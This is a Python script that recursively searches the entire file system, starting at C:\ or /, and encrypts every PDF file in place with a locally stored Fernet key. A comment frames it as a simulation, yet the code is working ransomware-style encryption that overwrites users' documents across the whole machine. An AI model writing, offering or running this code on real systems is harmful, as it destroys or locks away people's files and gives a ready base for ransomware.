import os
from cryptography.fernet import Fernet
import time

def generate_key():
    """Generate a key for encryption."""
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """Load the previously generated encryption key."""
    return open("secret.key", "rb").read()

def encrypt_file(file_path, key):
    """Encrypt a single file using the provided key."""
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)
    print(f"Encrypted: {file_path}")

def encrypt_pdfs_in_os(root_directory):
    """Encrypt all PDF files in the entire OS by searching recursively."""
    # Load the encryption key (or generate it if not available)
    if not os.path.exists("secret.key"):
        print("Generating a new encryption key...")
        generate_key()
    key = load_key()

    # Walk through all directories and encrypt PDFs
    for foldername, subfolders, filenames in os.walk(root_directory):
        for filename in filenames:
            if filename.endswith('.pdf'):
                try:
                    file_path = os.path.join(foldername, filename)
                    encrypt_file(file_path, key)
                    time.sleep(0.5)  # Slow down the process for better simulation feel
                except Exception as e:
                    print(f"Failed to encrypt {filename}: {e}")

if __name__ == "__main__":
    # Get the root directory based on OS
    if os.name == "nt":  # Windows
        root_directory = "C:\\"
    else:  # Linux/Mac
        root_directory = "/"

    encrypt_pdfs_in_os(root_directory)
